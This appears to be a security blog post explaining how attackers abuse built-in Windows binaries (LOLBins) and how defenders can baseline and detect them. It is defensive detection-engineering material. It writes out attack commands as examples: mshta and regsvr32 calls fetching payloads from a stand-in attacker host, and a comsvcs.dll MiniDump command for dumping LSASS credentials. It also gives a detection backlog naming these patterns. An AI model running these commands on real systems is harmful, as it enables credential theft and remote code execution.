---
title: "Living Off the Land: Why the Best Attackers Don't Look Like Attackers"
slug: "living-off-the-land"
date: 2026-05-14
tags:
  - "Detection Engineering"
  - "Red Team"
  - "Blue Team"
author: Hugh McGauran
excerpt: "Volt Typhoon maintained access to critical infrastructure networks in the United States for at least five years. Microsoft, Mandiant, and the Five Eyes governments published the technical details in 2024. The…"
layout: layouts/post.njk
---
Volt Typhoon maintained access to critical infrastructure networks in the United States for at least five years. Microsoft, Mandiant, and the Five Eyes governments published the technical details in 2024. The tradecraft was consistent across the campaign: almost no custom malware. The actors relied on built-in Windows tooling - PowerShell, WMI, scheduled tasks, RDP, and a handful of signed Microsoft binaries - to move laterally, persist, and exfiltrate. They were inside the network, doing real adversary work, and the security stack had no signature to alert on.

That is not a failure of detection engineering at any one organisation. It is the working state of the field. The attackers your threat model actually worries about - state-aligned actors targeting critical infrastructure, organised criminal groups running ransomware access brokers, long-dwell intrusion sets in finance and defence supply chains - have largely stopped bringing their own tools. They use yours.

The security industry has spent fifteen years and several billion dollars building detection around the wrong primitive. Almost every detection control in a typical SOC - antivirus, EDR signatures, YARA rules, file-write alerts, hash-based blocklists - keys on the artefact: the malware binary, the dropped DLL, the suspicious script. Modern attackers do not produce artefacts. They produce behaviour. And behaviour, when it lives entirely inside signed binaries, looks identical to the legitimate admin work that runs on every workstation every day.

This is the gap that lets adversaries persist for months or years inside networks that have every commercial detection product deployed and every framework checkbox ticked. The detection programme is tuned for the attackers of 2010. The attackers of 2026 are doing something different.

This post is about that gap. It is about what living-off-the-land tradecraft looks like in practice, why your current detection content misses it, and what a detection programme has to look like to catch the real attack shape. It is also about the operational work that has to happen before any of that matters - the baseline.

A quick word on scope. I am going to focus on the Microsoft Windows estate because that is where the LOLBin problem is most acute and where the tradecraft is most mature. The same principles apply to macOS and Linux environments, and the same baseline-plus-behaviour discipline applies there too - but the canonical examples live on Windows because that is where the adversary tooling is deepest. If you are defending a primarily macOS or Linux estate, the takeaway is the same shape, applied to your own binaries: `/bin/sh`, `curl`, `python`, `osascript`, `launchd` on macOS; `bash`, `curl`, `python`, `cron`, `systemd`, `ssh` on Linux. The tradecraft is platform-agnostic even when the binaries are not.

Let us start with the tradecraft itself, because if you do not understand what LOLBins look like in the wild, none of the detection conversation makes sense.

## What LOLBins Are, and Why They Are the Default

LOLBin is short for "living-off-the-land binary." The term was popularised in the late 2010s as defenders noticed adversaries abusing signed Microsoft binaries to do attacker work. The class has since expanded to cover any tool already present on the target system that can be repurposed for offensive operations: built-in Windows utilities, signed third-party admin tools, scripting hosts, and remote management frameworks.

The reason attackers prefer them is not ideological. It is operational.

- **Signed binaries bypass application control.** A binary signed by Microsoft Authenticode is, by default, trusted by Windows. Application allow-listing policies built around publisher or signature rules will let it run. Even mature EDR products treat signed Microsoft binaries as lower-risk during triage, because the false-positive cost of alerting on `powershell.exe` everywhere is unacceptable.
- **Common binaries blend into the environment.** Every workstation has PowerShell, WMI, schtasks, rundll32, mshta, regsvr32, net, whoami, and the rest. They run constantly for legitimate purposes. Statistically, they are everywhere. That makes statistical detection almost useless.
- **Hard to baseline, hard to attribute.** When a signed binary runs, the analyst question becomes: who ran it, with what arguments, to do what, against which target? Answering that requires deep process telemetry, command-line logging, and the ability to correlate a process tree back to a user and a session. Most SOCs do not have all of that for all binaries on all endpoints.
- **No malware to write.** The actor does not have to maintain a malware codebase, smuggle binaries past network controls, worry about EDR signatures updating, or handle attribution-friendly artefacts. The tradecraft is just calling admin tools in sequences that look administrative but are not.

The defender's framing of "we should catch the malware" stops being useful when there is no malware. The defender's framing of "we should catch the binary" stops being useful when the binary is PowerShell.

Here is the uncomfortable part: this is not a sophisticated tradecraft reserved for state-aligned APTs. The same patterns show up in commodity ransomware access, in mid-tier criminal intrusions, in phishing-driven business email compromise where the actor opens a WinRM session to the finance server. The attacker does not need to be APT29 to use PowerShell. They just need to be in the environment.

The historical arc matters here. Ten years ago, most intrusions were noise. The attacker dropped a binary, the binary did something obvious, and defenders had a chance. Five years ago, the noise had shifted to scripts - PowerShell scripts, VBScript, JScript - but the script content was still detectable, and many attackers were still sloppy enough to leave obvious IOCs. Today, the script content is gone. The binary is signed by Microsoft. The command-line arguments are reasonable. The behaviour is a sequence, not an event. The defender has to be operating at a different level to catch it.

This shift did not happen because defenders got worse. It happened because attackers got disciplined. The tradecraft migrated, the tooling leaked, and the training material spread. The same playbook that Volt Typhoon used against critical infrastructure in 2018 is now available in a public GitHub repository, with a step-by-step walkthrough, ready for any criminal actor to deploy. The defenders' job got harder while the attackers' job got easier, and most detection programmes have not caught up.

## Why Your EDR Cannot Catch the Real Threat

EDR is the centrepiece of modern endpoint detection. The category matured in the 2010s around a specific problem: detect malicious executables, malicious DLL loads, malicious script execution, and known-bad behaviours that fit a pattern of compromise. EDR products are very good at this problem. They are very good at it because it is the problem they were built to solve.

Living-off-the-land tradecraft is not that problem.

Consider what a typical EDR rule catalogue looks like:

1. Alert on known malicious file hashes.
2. Alert on known malicious script content.
3. Alert on LOLBin execution with specific command-line patterns - "rundll32 with no command-line arguments spawned by a non-system process," for example.
4. Alert on suspicious child processes - "Office application spawning cmd.exe or PowerShell."
5. Alert on known exploitation behaviour - "LSASS memory access from an unsigned process."

These rules catch a lot. They catch commodity malware, droppers, loaders, and the noisy early stages of many intrusions. They catch Mimikatz-style credential dumping. They catch obvious webshell activity. They are necessary.

They are also completely blind to a sophisticated LOLBin operator.

A LOLBin operator does not need a malicious file hash. They do not need a malicious script. They run signed Microsoft binaries with arguments that are syntactically reasonable and behaviourally plausible. They do not spawn suspicious child processes from Office applications - they open a remote PowerShell session over WinRM from a workstation that is already on the network. They do not touch LSASS directly - they read secrets from memory using signed credential management utilities, or they steal the token and use it elsewhere.

When your EDR fires on the LOLBin operator, it usually fires on something incidental. Maybe it catches the encoded PowerShell command line. Maybe it catches the unusual parent-child combination. Maybe it catches the network connection from the wrong binary. Those detections exist, and they are valuable, but they fire rarely, and they fire on the edge of the tradecraft - not on the substance of it.

The substance is: an attacker is operating inside your environment with the access profile of a helpdesk administrator, doing administrative-looking work, and your detection programme is not built to ask "is this administrative work normal?"

That is the gap. Not signatures. Not YARA. Not EDR tuning. The gap is that detection content at most organisations is built around what the binary is, not around what the activity means.

## The Baseline Problem: You Cannot Spot Abnormal Until You Know Normal

I have been in many SOCs. I have read many detection catalogues. I have reviewed many "tuning exercises." A common pattern shows up across most of them.

The detection engineer writes a rule that fires on a behaviour they believe is suspicious. The rule fires. The SOC investigates. The investigation concludes "this is the sysadmin doing sysadmin work." The detection engineer adds an exception. The rule fires less often. The rule gets deprioritised. Eventually it is disabled, or its threshold is raised until it only fires on actual abuse.

The rule was not wrong. The detection engineer was not incompetent. The rule was correct in principle but unworkable in operation because the SOC had no baseline for what "normal sysadmin work" actually looks like in that environment.

Baseline is the unglamorous, foundational work that nobody wants to do and almost nobody does well. To know that a PowerShell command line is anomalous, you need to know what PowerShell command lines normally look like in your environment. To know that a scheduled task creation is suspicious, you need to know what scheduled task creations normally look like in your environment. To know that an admin share access pattern is lateral movement, you need to know what admin share access patterns normally look like in your environment.

This is not a tooling problem. The tooling - EDR, SIEM, log aggregation - has the data. The problem is that nobody has spent the months required to characterise it.

A real baseline programme looks like this:

1. Pick a binary. PowerShell, schtasks, wmic, rundll32, mshta, regsvr32 - pick one.
2. Pull six months of telemetry on that binary. Every execution, every command line, every parent process, every user context, every target.
3. Group the executions by user role. Sysadmin, helpdesk, service account, developer, normal user.
4. For each role, characterise the top 20 command-line patterns. What does the sysadmin actually run? What does the helpdesk actually run?
5. Document it. Write it down. Make it visible to the SOC.
6. Now, and only now, are you in a position to detect deviations.

Without that baseline, every LOLBin detection rule is a coin flip. You will either fire too often (on legitimate admin work) or too rarely (because you raised the threshold to suppress false positives). Either way, you are not detecting.

The teams that catch LOLBin tradecraft have done this work. The teams that do not catch it have not. There is no shortcut.

Let me make this concrete with a worked example. Suppose you want to baseline PowerShell in a mid-sized Windows estate. The first thing you do is pull twelve months of process execution telemetry from your EDR. You are looking for every `powershell.exe` invocation, with command-line arguments, parent process, user context, and target host. In an estate of 5,000 endpoints running twelve months of telemetry, you are looking at roughly five to ten million PowerShell invocations. That sounds like a lot. It is not. It is a spreadsheet problem.

Sort by user. Identify the top 50 PowerShell users. Group them by role - sysadmins in one cluster, helpdesk in another, developers in a third, service accounts in a fourth. For each cluster, count the command-line patterns. You will find that the sysadmin cluster runs maybe a few hundred distinct command lines, of which perhaps 30 are run daily. The helpdesk cluster runs a different set, smaller, more repetitive. The developer cluster is the messiest, because developers run everything.

Document the top 20 command lines per cluster. That is your baseline. Anything in your environment running PowerShell that does not fit one of those patterns is candidate investigation. Anything in your environment running PowerShell under a user who is not in any of the clusters - a finance user, a marketing user, a sales engineer who has never run PowerShell before - is a higher-priority candidate.

The same exercise, repeated for `schtasks.exe`, `wmic.exe`, `mshta.exe`, `regsvr32.exe`, `rundll32.exe`, `sc.exe`, and the other LOLBins, gives you the foundation for an actual detection programme. The work is months, not weeks. The outcome is a detection catalogue that fires when it should and is silent when it should not.

That outcome is what most SOCs are missing. Not rules. Baseline.

## Long-Tail Telemetry: Behaviour Over Time, Not Single Events

The other thing that separates teams that detect LOLBins from teams that do not is the unit of detection.

Most SOC rules are event-based. A single event happens, a single rule fires, a single alert is created. This is how SIEM rules have been written for two decades. It is how most EDR rules are written. It is how most alerting logic works.

LOLBin tradecraft does not announce itself in a single event. It announces itself across a sequence of events, spread over hours or days, performed by a user who has legitimate access and is using legitimate tools.

The attacker does not log in and immediately run a suspicious command. They log in during business hours. They run some ordinary commands. They move on. Tomorrow, they log in at 3am and run a slightly different set of commands. Two days later, they create a scheduled task. A week later, they pivot. The whole operation is a long, low-signal sequence of ordinary-looking events.

Event-based detection cannot see this. Single-event rules miss it. Threshold rules miss it because the attacker stays under the threshold.

Sequence-based detection can see it. So can time-windowed detection. So can user-behaviour analytics that look at the distribution of activity over time. The key is that the detection logic operates on a longer unit of analysis: an hour, a day, a week, a "user session shape."

Examples:

- A user who has never logged in outside business hours starts logging in at 3am. A single logon event is not notable. The pattern is.
- A helpdesk account that has never created a scheduled task creates one. A single scheduled task creation is not notable. The deviation is.
- A workstation that has never connected to a finance server connects to one over WinRM. A single WinRM connection is not notable. The relationship is.
- A service account that has never made outbound network connections makes one to an unfamiliar external IP. The single connection is not notable. The deviation from the account's history is.
- A user who normally runs PowerShell for two-second interactive commands starts running PowerShell for twenty-minute sessions with high entropy in the script content. Each individual session is not notable. The shift in the distribution is.

These detections are not harder to build technically. Most SIEMs and UEBA products can express them. They are harder to build operationally because they require a baseline of "this user, this role, these systems, these times, these relationships." Back to baseline again.

The detection logic that catches these patterns typically looks like one of three forms:

1. **First-time detection.** Has this user, from this host, to this target, ever done this before? If the answer is no, alert. The simplest form. The most prone to false positives in immature environments, because legitimate first-time events are common. Useful once the baseline is mature.
2. **Time-windowed anomaly.** Has this user, in the last 30 days, logged in outside business hours? Run more than N commands in a single session? Connected to a new subnet? Look at a rolling window and detect when current activity falls outside it.
3. **Sequence correlation.** Within a defined time window (often 24 hours), did this user log in, run discovery commands, create a scheduled task, and make an outbound connection? Any single step is not notable. The sequence is. This is the most powerful form and the most operationally expensive to build, because it requires correlating multiple data sources.

Most SOCs do not have any of these three in production at scale. Most SOCs have plenty of single-event rules and almost no sequence correlation. That is a structural gap that vendor tooling cannot close. It is a programme gap, owned by the detection engineering team, that has to be filled with months of work.

The team that detects LOLBins has built a baseline and has detection logic that operates at the level of behaviour over time. The team that does not detect LOLBins is alerting on individual events and wondering why the attacker walked past.

## LOLBin Case Studies: What These Attacks Actually Look Like

Theory is one thing. Tradecraft is another. Let us walk through the patterns I see most often in real engagements - both defensive and offensive. These are the cases that show up in after-action reports across ransomware intrusions, state-aligned APT activity, and the long tail of post-intrusion activity that gets quietly remediated without public disclosure.

### PsExec for Lateral Movement

PsExec is a Sysinternals tool. It is signed by Microsoft. It is present in nearly every IT team's toolbox. It is also one of the most reliable lateral movement primitives in the LOLBin catalogue.

The attacker uses PsExec to push execution to a remote host. PsExec creates a service on the target (the service binary is named `PSEXESVC.exe` by default - this string is the most reliable detection signal). The service runs a command under the SYSTEM context of the target. The attacker gets a high-privilege shell on a remote host using credentials they have already obtained.

A defender who catches this in flight usually catches it because of the `PSEXESVC` service name. A defender who catches it from logs alone usually catches it because they baselined service creation by source user and tool - the IT helpdesk creates services using a different toolchain, with different naming conventions, at different times.

Detection focus: `PSEXESVC` service creation. Service creation events where the service binary name does not match the documented admin tooling. Service creation events from accounts that have never created services before.

### WMI for Execution and Lateral Movement

Windows Management Instrumentation is the Swiss army knife for admin work. It is also the Swiss army knife for attacker work.

The attacker uses `wmic.exe process call create` to spawn a process on a remote host. They use WMI event subscriptions for persistence. They use WMI queries to enumerate systems, users, and configurations. None of this requires custom tooling. All of it is built into Windows.

The detection challenge is volume. WMI queries are constant in any modern Windows environment. The detection signal is in the anomaly: a WMI process creation that is not part of the documented admin playbook, a WMI subscription created by a non-admin account, a WMI query from a host that does not normally issue WMI queries to the target.

Detection focus: WMI process creation events correlated with the source host, source user, and target host. WMI subscription creation events. Cross-reference against the documented admin automation.

### PowerShell for Everything

PowerShell is the most abused LOLBin in the modern catalogue because it is also the most capable. It supports remote execution. It supports download cradles. It supports encoded command lines that obscure the script content. It supports in-memory execution that never touches disk. It supports access to .NET, WMI, the registry, the file system, and Active Directory.

Attackers use PowerShell for initial code execution from a phishing payload. They use it for credential extraction from memory (Mimikatz is essentially a PowerShell-friendly tool, and there are PowerShell-native equivalents that do not even need Mimikatz). They use it for lateral movement, persistence, and exfiltration.

The traditional detection focus was on encoded command lines (`-EncodedCommand`, `-enc`) and known-bad script content. Both still catch low-skill operators. Sophisticated operators have moved past this. They use plaintext commands. They use PowerShell modules from disk. They use remoting over WinRM. They use constrained language mode bypasses.

The shift to PowerShell remoting is particularly important. When an attacker uses `Enter-PSSession` or `Invoke-Command` against a remote host, they are not dropping a payload on the remote host. They are opening an authenticated remote session over WinRM (ports 5985 or 5986) and running commands through the normal PowerShell remoting infrastructure. From the remote host's perspective, the commands look like any other PowerShell execution. From the network's perspective, the traffic looks like any other WinRM session. From the EDR's perspective, there is no suspicious binary, no encoded command line, no script content. There is just a PowerShell session, opened by an authenticated user, running documented cmdlets.

Detection focus: PowerShell ScriptBlock logging on every endpoint. PowerShell module logging. Cross-reference script content against the documented admin automation. Detect long-running PowerShell processes from accounts that have never run long-running PowerShell. Detect PowerShell network connections to external IPs. Detect PowerShell that loads .NET reflection, Add-Type, or other dynamic code patterns. Detect PowerShell remoting sessions (`WSMan` connections) from hosts that have never initiated them. Detect PowerShell that uses credential-handling cmdlets from non-admin contexts.

### mshta, regsvr32, rundll32 - The Proxy Execution Trio

These three binaries are the workhorses of proxy execution - running attacker code under the cover of a signed Microsoft binary.

`mshta.exe` executes HTA files. Attackers use it to run VBScript or JScript directly from a URL, often over HTTPS, bypassing content inspection. The tradecraft pattern is `mshta.exe https://attacker.example/payload.hta`. It is so common that any `mshta.exe` with a URL argument should be a high-priority alert.

`regsvr32.exe` loads DLLs. The "Squiblydoo" technique uses `regsvr32.exe /s /n /u /i:http://attacker.example/payload.sct scrobj.dll` to execute a COM scriptlet from a URL. The `/i:` argument is the giveaway. Any `regsvr32.exe` with a URL or script reference should be investigated.

`rundll32.exe` runs DLL exports. Attackers use it to execute shellcode, load malicious DLLs, or proxy execution in ways that avoid direct script execution. The detection signal is rundll32 with no arguments or with an unusual DLL path, especially when the parent process is not a known system process.

All three are heavily abused, well-documented, and have specific detection patterns. None of them should ever run silently in your environment. If they do, you have a detection gap.

### Scheduled Tasks, Services, and Autostart Persistence

LOLBins are not just for execution. They are also the persistence layer.

`schtasks.exe` creates scheduled tasks. Attackers use it for persistence because scheduled tasks survive reboots and run in specific security contexts. A scheduled task that runs PowerShell at user logon, or a task that runs a script from a temp directory, is a classic persistence pattern.

`sc.exe` creates Windows services. Attackers use it for the same reason - services run in specific security contexts and survive reboots. The detection signal is a service binary path that points to an unusual location, or a service created by a user who does not normally create services.

Registry run keys, startup folders, and WMI event subscriptions round out the persistence layer. Each one has its own LOLBin mechanism and its own detection pattern.

Detection focus: Document the legitimate persistence mechanisms in your environment. Every scheduled task that is supposed to exist. Every service that is supposed to exist. Every registry run key that is supposed to exist. Anything outside that inventory is candidate persistence.

### RDP, WinRM, and SMB for Lateral Movement

LOLBins are not only Microsoft executables. The remote management protocols that ship with Windows are also LOLBins in spirit - built-in tools that the attacker uses to move laterally.

RDP (`mstsc.exe`) is the obvious one. WinRM over HTTP and HTTPS is the less obvious but more common one in mature environments. SMB admin shares (`C$`, `ADMIN$`) are the third. PsExec uses SMB under the hood. WMI uses DCOM. The whole lateral movement story is built on tools that are allowed by network policy, signed by Microsoft, and required for the business to function.

The detection challenge is that these tools are used legitimately constantly. Helpdesk uses RDP to fix workstations. Sysadmins use WinRM to manage servers. Service accounts use SMB to copy files. The attacker uses them the same way.

The detection signal is in the relationships: who connects to which host, from where, at what time, using what credentials. A workstation connecting to a server it has never connected to before. A user account connecting to a host it has never connected to before. A connection at 3am from a user who never works at 3am.

Detection focus: Asset and identity baselines. Document the normal pattern of admin connections. Detect deviations.

### Discovery Command Bursts

One of the more recognisable patterns is the discovery burst - an attacker running a sequence of recon commands in rapid succession: `whoami`, `ipconfig`, `net user`, `net group`, `net localgroup administrators`, `net view`, `systeminfo`, `tasklist`, `netstat`. Each individual command is harmless. The sequence is unmistakable.

Detection focus: Count discovery commands per user session. Detect a burst of recon commands from a user who has not previously run them. Detect discovery commands from a workstation context where they are not part of the admin playbook.

### Credential Access Without Mimikatz

The classical detection is "Mimikatz on disk." Sophisticated attackers do not need Mimikatz. They use `comsvcs.dll` with `MiniDump` to dump LSASS. They use `procdump.exe` (signed by Microsoft as part of Sysinternals) to dump LSASS. They use `ntdsutil.exe` to copy the Active Directory database. They use `vssadmin.exe` to create shadow copies and read sensitive files out of them. They use Windows credential management APIs in PowerShell.

The `comsvcs.dll` MiniDump technique is worth pausing on. The full command is:

`rundll32.exe comsvcs.dll, MiniDump <lsass_pid> C:\Windows\Temp\dump.bin full`

That is it. A single rundll32 command. It runs in user context. It writes a memory dump to disk. The attacker picks up the dump and extracts credentials offline, on their own infrastructure, using their own tooling. The detection signal on the host is one process execution. The damage happens off-host, where you have no telemetry at all.

This is what LOLBin credential access looks like in practice. No malware. No Mimikatz signature. Just a Microsoft-signed binary called in a specific way, with output that looks like any other admin's temp file. The defender who catches it is the defender who has a rule for the exact pattern `rundll32.exe comsvcs.dll, MiniDump`. The defender who catches the variations - different output paths, different target processes, output piped to a network share - has baselined rundll32 execution and detects deviations from the documented admin use.

Detection focus: LSASS access from non-standard processes. Shadow copy creation events. AD database file access. Sysinternals tool execution from non-admin contexts. `MiniDump` patterns specifically. `ntdsutil` "ifm" and "ac in ntds" sequences. Shadow copy creation followed within minutes by file access to the created shadow.

## Detection Engineering for LOLBins: A Different Programme

If you have taken the previous sections seriously, the implication for your detection programme is not "add more rules." The implication is that you have to build a different kind of programme.

Three shifts matter.

**Shift 1: From artefact to behaviour.**

Most detection catalogues are built around artefacts - file hashes, script content, binary names. The shift is to behaviour: what the activity looks like in aggregate. The behaviour is harder to write rules for, but it is what catches LOLBin tradecraft. Build detections that answer questions like "is this user behaving like themselves" and "is this host behaving like itself," not "is this binary known-bad."

**Shift 2: From single event to sequence.**

LOLBin tradecraft is a sequence of events. Detection rules that fire on a single event miss most of it. Build detections that operate across a time window and across multiple events: a logon followed by a discovery burst, followed by a scheduled task creation, followed by an outbound network connection. The detection logic is correlation, not single-event matching.

**Shift 3: From signature to baseline.**

The hardest shift is also the most important. Without a baseline of what normal looks like, every LOLBin detection rule is guesswork. The teams that catch this tradecraft have spent the months required to build the baseline. There is no product that gives you this for free. There is no shortcut.

Practically, the work looks like this:

1. Build an inventory of the binaries you care about. PowerShell, schtasks, wmic, mshta, regsvr32, rundll32, sc, net, RDP, WinRM. The list will grow.
2. For each binary, pull six to twelve months of telemetry. Every execution. Every command line. Every user.
3. Group the executions by user role and document the patterns. This is a multi-week project. Plan for it.
4. Build detections that operate on deviations from the documented patterns.
5. Tune the detections over months. Expect false positives. Expect tuning cycles. Do not disable rules because they fire - fix the baseline until the rule is precise.

The work is unglamorous. It is also the foundation of everything else. Teams that try to skip it end up with detection catalogues full of rules that fire too often or too rarely, and they cannot tell which.

One thing that often gets overlooked: this work is also a cultural change. The detection engineer who writes LOLBin rules against an unbaselined environment will be told, repeatedly, that the rules are wrong because they fire on legitimate activity. The detection engineer who writes LOLBin rules against a baselined environment will be told, repeatedly, that the rules are right because they fire on illegitimate activity. The difference between those two outcomes is not skill. It is months of baseline work done before the rule was written.

That is a hard message for leadership to absorb. It is also true. A detection programme that wants to catch LOLBin tradecraft has to invest in baseline work for one to two quarters before it sees a meaningful uplift in detection quality. Leadership that wants immediate rule output gets immediate rule output - and pays for it later in false positives, alert fatigue, and untuned rules that nobody trusts. Leadership that accepts the timeline gets a detection programme that catches the real attack shape. The choice is not technical. It is managerial.

## Your Detection Backlog: A Concrete List to Build

Here is a backlog of detections that catches the LOLBin tradecraft I have described. None of these are exotic. Most of them are achievable with mainstream EDR and SIEM tooling. The hard part is not the rules - it is the baseline that makes them precise.

### Process and Execution

1. `mshta.exe` with any URL or HTTP argument. High-priority alert.
2. `regsvr32.exe` with `/i:` argument referencing a URL or script.
3. `rundll32.exe` with no arguments, or with a DLL path that is not part of the documented admin toolkit.
4. Office applications (Word, Excel, Outlook, PowerPoint) spawning `cmd.exe`, `powershell.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, or `rundll32.exe`.
5. `powershell.exe` with `-EncodedCommand`, `-enc`, `-nop`, or other obfuscation flags. Cross-reference against the documented admin automation.
6. `wmic.exe process call create`. Alert on every instance, then tune against the admin automation. Almost no legitimate uses.
7. `schtasks.exe /create` from a user who is not in the documented admin role set.
8. `sc.exe create` with a binary path that is not in the standard service inventory.
9. Discovery command bursts: count of `whoami`, `ipconfig`, `net user`, `net group`, `systeminfo`, `tasklist`, `net view` per user session, alert on a sudden burst.
10. Sysinternals tools (`procdump.exe`, `psexec.exe`, `pskill.exe`, `psloggedon.exe`) executed from a non-admin context.

### Lateral Movement

11. Service creation events where the service binary name is `PSEXESVC.exe` or contains `psexec`.
12. Inbound RDP, WinRM, or SMB connections from a workstation to a server it has never connected to before.
13. Inbound RDP, WinRM, or SMB connections from a user account to a host it has never connected to before.
14. Connections outside business hours from accounts that have never connected outside business hours.
15. WinRM sessions (ports `5985`, `5986`) originating from workstation IP ranges.
16. DCOM lateral movement patterns: `mmc20_application`, `shellwindows`, `shellbrowserwindow`, `exefrompassthru`.

### Persistence

17. Scheduled task creation outside the documented inventory. Maintain the inventory.
18. WMI event subscription creation (`__EventFilter`, `CommandLineEventConsumer`, `__EventConsumer`). Alert on every creation.
19. New registry run keys (`HKLM\Software\Microsoft\Windows\CurrentVersion\Run`, `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, and equivalents) outside the documented baseline.
20. New services outside the documented service inventory.
21. New scheduled tasks outside the documented task inventory.

### Credential Access

22. LSASS process access from non-standard processes - anything outside `lsass.exe` reading itself, `procexp`, documented AV, and so on.
23. `comsvcs.dll` MiniDump pattern: `rundll32.exe comsvcs.dll, MiniDump <pid> <output> full`.
24. Shadow copy creation followed by file access to sensitive paths (`NTDS.dit`, `SAM` hive, and so on).
25. `ntdsutil.exe` "activate instance ntds" followed by "ifm" or "ac in ntds" - the credential extraction pattern.
26. `vssadmin.exe` shadow copy creation outside the documented backup window.

### Defence Evasion

27. Log clearing: `wevtutil cl`, `Clear-EventLog`, `Remove-Item` against event log paths. Alert on every instance.
28. Timestamp stomping: `Set-ItemProperty` on file `LastWriteTime` in bulk, or `timestomp.exe` execution.
29. Sysmon or EDR agent stop, start, service disable, or uninstall events.
30. Disabling of Windows Defender features via PowerShell or `Set-MpPreference`.

### Exfiltration

31. Outbound network connections from `rundll32.exe`, `mshta.exe`, `regsvr32.exe`, `powershell.exe` to external IPs. The binary should not normally be making external connections.
32. Large outbound data transfers from servers to external IPs outside the documented business traffic.
33. DNS tunnelling patterns: long subdomain labels, high entropy, high query volume to a single domain.
34. Cloud storage uploads (`storage.googleapis.com`, `*.blob.core.windows.net`, `*.s3.amazonaws.com`) from hosts that should not be talking to them.

That is a starting backlog. Thirty-four detections, none exotic, all achievable with the tooling most SOCs already own. The hard part is the baseline work that makes them precise.

## What This Means for Your Programme

If you have read this far, you are probably in one of two situations.

Either you have detection rules that look roughly like the list above, the baseline work to make them precise, and a SOC that knows what LOLBin tradecraft looks like. In that case, this post is a confirmation of the work you have already done. Keep going.

Or you have detection rules that look roughly like the list above, and the baseline work has not been done, and the SOC is drowning in false positives from LOLBin rules that fire too often, or is missing actual tradecraft because the rules are tuned down to silence. In that case, you have work to do.

Here is the Monday morning list:

1. **Audit your current LOLBin detections.** What do you actually have? Which LOLBins are covered? Which are not? Where are the gaps?
2. **Pick one binary.** Do not try to baseline everything at once. Pick PowerShell. Or schtasks. Or wmic. Pick the one that matters most in your environment.
3. **Pull six months of telemetry on that binary.** Every execution. Every command line. Every user. Every host. The data is almost certainly there in your EDR or SIEM.
4. **Document the patterns.** Group by user role. Identify the legitimate patterns. Write it down.
5. **Build the detection against deviation.** Once you know the legitimate patterns, write the rule that fires on what is not legitimate. Expect false positives. Tune.
6. **Repeat for the next binary.** And the next. This is a multi-quarter programme, not a multi-week one.
7. **Invest in sequence-based detections.** Your single-event rules will keep catching the easy stuff. The hard stuff is across time. Build the correlation logic that catches it.
8. **Make the baseline visible.** A baseline that lives in one analyst's head is useless. A baseline that is documented, version-controlled, and shared with the SOC is operational.

Living-off-the-land tradecraft is not a new phenomenon. It has been the working tradecraft of sophisticated adversaries for the better part of a decade. What is changing is that it is no longer restricted to sophisticated adversaries - the commoditisation of intrusion sets, the leak of post-exploitation tooling, and the spread of training material mean that mid-tier criminal actors now run the same tradecraft that APT29 ran five years ago. Your detection programme has to catch all of it.

The work is not glamorous. It is not what gets a vendor pitch deck. It does not produce a marketing-friendly compliance number. It is the work that catches the attack when it actually happens.

That is the work. Do it.

---

*Next week: Building the LOLBin baseline - practical steps for PowerShell, schtasks, wmic, and the other binaries that matter. Plus: how to make the baseline maintainable as your environment changes.*
